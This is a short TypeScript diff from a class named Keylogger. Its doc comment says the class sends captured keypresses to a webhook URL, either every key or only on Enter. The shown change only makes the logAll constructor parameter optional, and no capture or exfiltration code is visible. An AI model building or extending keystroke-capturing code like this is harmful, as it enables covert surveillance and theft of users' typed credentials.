@@ -17,7 +17,7 @@ export default class Keylogger {
      * @param { string } webhook - URL of the webhook to send captured data.
      * @param { boolean } [logAll=false] - Whether to log every keypress (`true`) or only on the "Enter" key (`false`).
      */
-    constructor(webhook: string, logAll: boolean | undefined) {
+    constructor(webhook: string, logAll?: boolean | undefined) {
         this.webhook = webhook;
         const masterSession: string = this.getOrCreateMasterSession();
         this.initializeSession(masterSession);
